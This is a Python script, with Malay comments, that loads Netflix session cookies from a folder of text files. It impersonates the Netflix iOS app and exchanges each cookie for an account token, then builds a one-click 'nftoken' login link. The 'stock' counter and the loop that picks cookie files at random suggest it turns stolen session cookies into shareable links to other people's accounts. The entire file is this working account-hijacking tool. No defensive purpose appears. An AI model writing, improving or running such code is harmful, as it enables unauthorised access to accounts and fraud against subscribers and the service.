import os
import random
import re
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Path folder NetCookie
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIE_FOLDER = os.path.join(SCRIPT_DIR, "NetCookie")

# Endpoint Netflix
API_URL_IOS = "https://www.netflix.com/api/shakti/v1/account/token"
QUERY_PARAMS_IOS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
    "languages": "en-US",
    "locale": "en-US",
}

BASE_HEADERS_IOS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId")

# 1. Fungsi baca fail cookie
def get_raw_files():
    if not os.path.isdir(COOKIE_FOLDER): return []
    return [f for f in os.listdir(COOKIE_FOLDER)
            if f.lower().endswith(".txt") and os.path.isfile(os.path.join(COOKIE_FOLDER, f))]

def get_stock_by_plan():
    return {"Valid": 0, "Raw": len(get_raw_files())}

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"): continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookie_dict[parts[5]] = parts[6]
    for key in COOKIE_KEYS:
        if key in cookie_dict: continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match: cookie_dict[key] = match.group(1)
    return cookie_dict

# 2. Fungsi minta nftoken dari Netflix
def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get("NetflixId")
    secure_id = cookie_dict.get("SecureNetflixId")
    if not netflix_id: raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS_IOS)
    cookie_str = f"NetflixId={netflix_id}"
    if secure_id: cookie_str += f"; SecureNetflixId={secure_id}"
    headers["Cookie"] = cookie_str

    try:
        r = requests.get(API_URL_IOS, params=QUERY_PARAMS_IOS, headers=headers, timeout=15, verify=False)
        r.raise_for_status()
        data = r.json()
        value = data.get("value") or {}
        token_data = (((value.get("account") or {}).get("token") or {}).get("default") or {})
        token, expires = token_data.get("token"), token_data.get("expires")
        if not token: raise ValueError("No token")
        if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
        return token, expires
    except Exception as e:
        raise ValueError(str(e)[:50])

# 3. Fungsi utama yang dipanggil oleh main.py
def try_get_login_url(max_attempts=20):
    raw_files = get_raw_files()
    if not raw_files:
        return False, None, None, "Tiada fail cookie.", None, None

    tried = set()
    reasons = []

    while len(tried) < len(raw_files) and len(tried) < max_attempts:
        remaining = [f for f in raw_files if f not in tried]
        if not remaining: break
        chosen = random.choice(remaining); tried.add(chosen)
        path = os.path.join(COOKIE_FOLDER, chosen)
        
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read().strip()
            cd = extract_cookie_dict(content)
            
            # Terus minta link tanpa check playback
            token, expires = fetch_nftoken(cd)
            
            return (
                True,
                f"https://netflix.com/?nftoken={token}",
                expires,
                None,
                chosen,
                {"plan": "Unknown", "country": "-", "email": "-"},
            )
        except Exception as exc:
            reasons.append(str(exc)[:30])
            continue

    return False, None, None, f"Gagal: {'; '.join(reasons[-3:])}", None, None
